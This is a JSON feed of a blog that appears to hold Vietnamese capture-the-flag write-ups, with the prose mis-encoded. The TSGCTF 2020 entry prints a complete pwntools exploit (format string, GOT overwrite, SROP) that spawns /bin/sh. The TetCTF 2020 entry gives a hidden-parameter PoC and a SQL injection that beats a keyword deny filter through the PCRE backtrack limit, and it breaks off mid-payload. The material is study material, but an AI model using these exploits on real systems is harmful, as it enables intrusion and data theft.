{
  "version": "https://jsonfeed.org/version/1",
  "title": "son&#39;s blog",
  "home_page_url": "https://quynh0n.github.io/",
  "feed_url": "https://quynh0n.github.io/feed/feed.json",
  "description": "I am writing about my experiences as a naval navel-gazer.",
  "author": {
    "name": "Son Tran",
    "url": "https://quynh0n.github.io/about-me/"
  },
  "items": [{
      "id": "https://quynh0n.github.io/posts/tsgctf-2020-beginners-pwn/",
      "url": "https://quynh0n.github.io/posts/tsgctf-2020-beginners-pwn/",
      "title": "TSGCTF 2020 - Beginner&#39;s Pwn",
      "content_html": "<h2 id=\"foreword\">Foreword <a class=\"direct-link\" href=\"#foreword\">#</a></h2>\n<p>Theo nh∆∞ description c·ªßa ƒë·ªÅ th√¨ b√†i n√†y l√† s·ª± t·ªïng h·ª£p c·ªßa c√°c techniques nh∆∞:</p>\n<ul>\n<li>Format String</li>\n<li>GOT (Global Offset Table) overwrite</li>\n<li>Buffer Overflow</li>\n<li>ROP (Return-Oriented Programming)</li>\n<li>sigreturn syscall (aka SROP)</li>\n</ul>\n<p>Th√¨ ch√∫ng ta ch·ªâ vi·ªác follow theo ƒë·∫•y m√† l√†m th√¥i.</p>\n<h2 id=\"exploit\">Exploit <a class=\"direct-link\" href=\"#exploit\">#</a></h2>\n<p><img src=\"/img/tsgctf-2020/main_fn.jpg\" alt=\"\"><br>\n<img src=\"/img/tsgctf-2020/checksec.jpg\" alt=\"\"></p>\n<p>Nh∆∞ ch√∫ng ta th·∫•y th√¨ NX v√† Canary ƒë·ªÅu ƒë∆∞·ª£c enabled (ƒë·∫°i kh√°i l√† kh√¥ng th·ªÉ ch·∫°y shellcode v√† buffer overflow nh∆∞ b√¨nh th∆∞·ªùng). Nh∆∞ng b√†i n√†y c√≥ Format String (ƒë·∫∑c tr∆∞ng c·ªßa l·ªói Format String l√† ch√∫ng ta c√≥ th·ªÉ ghi ƒë∆∞·ª£c m·ªçi address, mi·ªÖn l√† c√≥ quy·ªÅn write) n√™n ch√∫ng ta c√≥ th·ªÉ bypass ƒë∆∞·ª£c Canary.</p>\n<h3 id=\"idea\">Idea <a class=\"direct-link\" href=\"#idea\">#</a></h3>\n<p>Idea c·ªßa em trong b√†i n√†y step-by-step nh∆∞ sau:</p>\n<ol>\n<li>Overwrite <code>__stack_chk_fail</code> GOT address ƒë·ªÉ tr√°nh exit program khi ƒë√® qua canary</li>\n<li>Ghi <code>format</code> string c·ªßa h√†m <code>scanf</code> l√™n section c√≥ quy·ªÅn write (·ªü ƒë√¢y l√† .bss section)</li>\n<li>L√†m <code>rax=0xf</code> khi ch·∫°y qua h√†m scanf ƒë·ªÉ g·ªçi <code>sys_rt_sigreturn</code> syscall</li>\n<li>Craft 1 stack frame b·∫±ng <code>pwntools</code> ƒë·ªÉ ch·∫°y <code>sys_execve</code> syscall</li>\n</ol>\n<h3 id=\"exploit-analyse\">Exploit Analyse <a class=\"direct-link\" href=\"#exploit-analyse\">#</a></h3>\n<pre class=\"language-python\"><code class=\"language-python\"><span class=\"highlight-line\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\">binary <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./beginners_pwn'</span><span class=\"token punctuation\">,</span> checksec<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\">p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'35.221.81.216'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30002</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\">got_table <span class=\"token operator\">=</span> binary<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_GLOBAL_OFFSET_TABLE_'</span><span class=\"token punctuation\">]</span></span><br><span class=\"highlight-line\">start_main_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x401203</span></span><br><span class=\"highlight-line\">end_main_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x401256</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\">pop_rdi_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x4012c3</span></span><br><span class=\"highlight-line\">pop_rsi_r15_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x4012c1</span></span><br><span class=\"highlight-line\">syscall <span class=\"token operator\">=</span> <span class=\"token number\">0x40118f</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\">p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'%7$s%s'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'got.__stack_chk_fail'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>p64<span class=\"token punctuation\">(</span>end_main_ret<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># ƒëo·∫°n n√†y slice ƒëi 1 byte cao ƒë·ªÉ kh√¥ng b·ªã ƒë√® v·ªõi h√†m ngay b√™n d∆∞·ªõi __stack_chk_fail l√† scanf</span></span><br><span class=\"highlight-line\">p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">'A'</span><span class=\"token operator\">*</span><span class=\"token number\">24</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>end_main_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>start_main_ret<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># ƒëo·∫°n n√†y ph·∫£i 16 bytes stack-aligned</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\">p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'%7$s%s'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>got_table<span class=\"token operator\">+</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">'%1$s'</span><span class=\"token operator\">*</span><span class=\"token number\">0xf</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># ghi '%1$s' 15 l·∫ßn v√†o .bss</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\">payload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span>pop_rdi_ret<span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>got_table<span class=\"token operator\">+</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>pop_rsi_r15_ret<span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>got_table<span class=\"token operator\">+</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'plt.__isoc99_scanf'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\"><span class=\"token comment\"># scanf(format=got_table+0x30, varargs=got_table+0x80)</span></span><br><span class=\"highlight-line\"><span class=\"token comment\"># sau khi nh·∫≠p 15 l·∫ßn '/bin/sh' (line 45) v√†o scanf th√¨ l√∫c ƒë√≥ rax=0xf v√† nh·∫£y v√†o syscall lu√¥n</span></span><br><span class=\"highlight-line\"><span class=\"token comment\"># '/bin/sh' s·∫Ω lu√¥n ƒë∆∞·ª£c ghi v√†o c√πng 1 ƒë·ªãa ch·ªâ l√† argument ƒë·∫ßu ti√™n (·ªü ƒë√¢y ch√≠nh l√† got_table+0x80)</span></span><br><span class=\"highlight-line\">payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>syscall<span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\"><span class=\"token comment\"># Setup stack frame cho Sigreturn</span></span><br><span class=\"highlight-line\">frame <span class=\"token operator\">=</span> SigreturnFrame<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">frame<span class=\"token punctuation\">.</span>rax <span class=\"token operator\">=</span> <span class=\"token number\">0x3b</span> <span class=\"token comment\"># sys_execve</span></span><br><span class=\"highlight-line\">frame<span class=\"token punctuation\">.</span>rdi <span class=\"token operator\">=</span> got_table<span class=\"token operator\">+</span><span class=\"token number\">0x80</span> <span class=\"token comment\"># '/bin/sh\\x00'</span></span><br><span class=\"highlight-line\">frame<span class=\"token punctuation\">.</span>rsi <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token comment\"># reset rsi</span></span><br><span class=\"highlight-line\">frame<span class=\"token punctuation\">.</span>rdx <span class=\"token operator\">=</span> <span class=\"token number\">0</span> <span class=\"token comment\"># reset rdx</span></span><br><span class=\"highlight-line\">frame<span class=\"token punctuation\">.</span>rip <span class=\"token operator\">=</span> syscall <span class=\"token comment\"># jump t·ªõi syscall address ƒë·ªÉ g·ªçi sys_execve</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\">payload <span class=\"token operator\">+=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>frame<span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\">p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">'A'</span><span class=\"token operator\">*</span><span class=\"token number\">24</span> <span class=\"token operator\">+</span> payload<span class=\"token punctuation\">)</span></span><br><span class=\"highlight-line\">p<span class=\"token punctuation\">.</span>sendlines<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token string\">'/bin/sh\\x00'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span><span class=\"token number\">0xf</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># G·ª≠i '/bin/sh\\x00' 15 l·∫ßn</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\">p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></span></code></pre>\n",
      "date_published": "2020-07-15T00:00:00+00:00"
    },{
      "id": "https://quynh0n.github.io/posts/tetctf-2020-web-writeup/",
      "url": "https://quynh0n.github.io/posts/tetctf-2020-web-writeup/",
      "title": "TetCTF 2020 - Web",
      "content_html": "<h2 id=\"wysinwyg\">WYSINWYG <a class=\"direct-link\" href=\"#wysinwyg\">#</a></h2>\n<pre><code>What you see is not what you get... Do you see the flag? then you don't get the flag.\n</code></pre>\n<p>T√°c gi·∫£ cho ta m·ªôt ƒëo·∫°n code PHP ng·∫Øn:</p>\n<pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span><br><span class=\"highlight-line\"><span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span><span class=\"token double-quoted-string string\">\"display_errors\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\"><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token single-quoted-string string\">'secret.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\"><span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">    <span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">    <span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span> <span class=\"token operator\">===</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'a‚Å°'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'b‚Å¶'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></span><br><mark class=\"highlight-line highlight-line-active\">                <span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'a‚Å°'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></mark><br><span class=\"highlight-line\">                <span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'b‚Å¶'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span> <span class=\"token operator\">!==</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">                    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">                <span class=\"token punctuation\">}</span></span><br><span class=\"highlight-line\">            <span class=\"token punctuation\">}</span></span><br><span class=\"highlight-line\">        <span class=\"token punctuation\">}</span></span><br><span class=\"highlight-line\">    <span class=\"token punctuation\">}</span></span><br><span class=\"highlight-line\"><span class=\"token punctuation\">}</span></span></code></pre>\n<p>B√†i n√†y t√°c gi·∫£ ch√®n 2 k√≠ t·ª± <a href=\"https://en.wikipedia.org/wiki/Zero-width_space\">zero-width space</a> v√†o sau <code>a</code> v√† <code>b</code> ·ªü d√≤ng 12.</p>\n<p>PoC:</p>\n<pre><code>/?a=1&amp;b=1&amp;a%E2%81%A1=1&amp;b%E2%81%A6=0\n</code></pre>\n<h2 id=\"secure-system\">Secure System <a class=\"direct-link\" href=\"#secure-system\">#</a></h2>\n<pre><code>I created a security checker, can you help audit the source?\nSource: https://drive.google.com/file/d/1vOPmS30ZrW5-Uoz-AKBef3T6no2qpvt_/view\n</code></pre>\n<p>Source code ch·ªâ c√≥ 1 file index.php nh∆∞ sau:</p>\n<pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\"><span class=\"token keyword\">require_once</span><span class=\"token punctuation\">(</span><span class=\"token single-quoted-string string\">'dbconnect.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\"><span class=\"token variable\">$flag</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span> <span class=\"token double-quoted-string string\">\"SELECT * FROM xxxxxxxxxxxxxxxxxxx\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">fetch_assoc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'yyyyyyyyyyyyyyyyyyyy'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//Sorry It's our secret, can't share</span></span><br><span class=\"token delimiter important\">?></span></span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span></span><br><span class=\"highlight-line\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span></span><br><span class=\"highlight-line\">    Security Check!!! Please enter your ID to prove who are you !!!:</span><br><span class=\"highlight-line\">    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>index.php<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>POST<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></span><br><span class=\"highlight-line\">        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>id<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">/></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>br</span><span class=\"token punctuation\">></span></span></span><br><span class=\"highlight-line\">        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Submit<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">/></span></span></span><br><span class=\"highlight-line\">    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span></span><br><span class=\"highlight-line\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">></span></span></span><br><span class=\"highlight-line\"></span><br><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span><br><span class=\"highlight-line\"></span><br><span class=\"highlight-line\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token single-quoted-string string\">'/and|or|in|if|case|sleep|benchmark/is'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token single-quoted-string string\">'Tet nhat ai lai hack nhau :(, very dangerous key word'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">elseif</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token single-quoted-string string\">'/order.+?by|union.+?select/is'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token single-quoted-string string\">'Tet nhat ai lai hack nhau :(, very dangerous statement'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">        <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span> <span class=\"token double-quoted-string string\">\"SELECT * FROM users WHERE id=\"</span> <span class=\"token punctuation\">.</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token operator\">></span><span class=\"token function\">fetch_assoc</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token single-quoted-string string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$user</span> <span class=\"token operator\">!==</span> <span class=\"token single-quoted-string string\">'admin'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">            <span class=\"token keyword\">echo</span> <span class=\"token single-quoted-string string\">'Hello '</span> <span class=\"token punctuation\">.</span> <span class=\"token function\">htmlentities</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$user</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$user</span> <span class=\"token operator\">===</span> <span class=\"token single-quoted-string string\">'admin'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">                <span class=\"token keyword\">echo</span> <span class=\"token single-quoted-string string\">'This can\\'t be =]] Just put here for fun lul'</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">                <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><br><span class=\"highlight-line\">            <span class=\"token punctuation\">}</span></span><br><span class=\"highlight-line\">        <span class=\"token punctuation\">}</span></span><br><span class=\"highlight-line\">    <span class=\"token punctuation\">}</span></span><br><span class=\"highlight-line\"><span class=\"token punctuation\">}</span></span><br><span class=\"token delimiter important\">?></span></span></code></pre>\n<p>D√≤ng 4 ch√∫ng ta c√≥ 1 hint c·ªßa t√°c gi·∫£ l√† ph·∫£i s·ª≠ d·ª•ng SQL Injection v√† leak ƒë∆∞·ª£c flag ·ªü 1 column Y v√† table X n√†o ƒë√≥ m√† ch√∫ng ta ch∆∞a bi·∫øt trong database.</p>\n<p>Ch√∫ng ta b·ªã ch·∫∑n s·ª≠ d·ª•ng c√¢u l·ªánh <code>order by</code> v√† <code>union select</code>, ƒë·∫∑c bi·ªát l∆∞u √Ω l√† c·ª•m <code>in</code> c≈©ng b·ªã ch·∫∑n, ƒëi·ªÅu n√†y d·∫´n ƒë·∫øn s·∫Ω c√≥ ƒë√¥i ch√∫t kh√≥ khƒÉn ƒë·ªÉ ta l·∫•y ƒë∆∞·ª£c table name v√† column name t·ª´ <code>information_schema</code> c≈©ng nh∆∞ c√°c database c√≥ prefix <code>innodb</code>.</p>\n<p>Nh∆∞ng ch√∫ng ta c√≥ th·ªÉ bypass <code>preg_match</code> ·ªü d√≤ng 21 b·∫±ng c√°ch l√†m cho PCRE (Engine x·ª≠ l√≠ Regular Expression trong PHP) x·ª≠ l√≠ input c·ªßa ta, l√†m cho v∆∞·ª£t qu√° backtrack limit m·∫∑c ƒë·ªãnh <a href=\"https://www.php.net/manual/en/pcre.configuration.php\">c·ªßa</a> <a href=\"https://stackoverflow.com/a/40426462\">PHP</a>. B·∫±ng c√°ch n√†y, ch√∫ng ta c√≥ th·ªÉ s·ª≠ d·ª•ng <code>order by</code> hay <code>union select</code> d·ªÖ d√†ng.</p>\n<h3 id=\"get-table-name\">Get table name <a class=\"direct-link\" href=\"#get-table-name\">#</a></h3>\n<p>M√¨nh quy·∫øt ƒë·ªãnh s·ª≠ d·ª•ng view <code>x$ps_schema_table_statistics_io</code> c√≥ trong database <code>sys</code> v√¨ theo nh∆∞ <a href=\"https://dev.mysql.com/doc/refman/5.7/en/sys-schema-table-statistics.html\">MySQL documentation</a> m√¥ t·∫£:</p>\n<pre><code>These views summarize table statistics. By default, rows are sorted by descending total wait time (tables with most contention first).\n</code></pre>\n<p>v√† trong view n√†y c≈©ng c√≥ ch·ª©a 2 columns l√† <code>table_schema</code> v√† <code>table_name</code>.</p>\n<pre class=\"language-python\"><code class=\"language-python\"><span class=\"highlight-line\">res <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span><span class=\"token string\">'http://45.77.240.178:8002/index.php'</span><span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span></span><br><span class=\"highlight-line\">    <span class=\"token string\">'id'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'5 union/*'</span> <span class=\"token operator\">+</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">1000000</span> <span class=\"token operator\">+</span> <span class=\"token string\">'*/select 1,group_concat(table_name),3 from 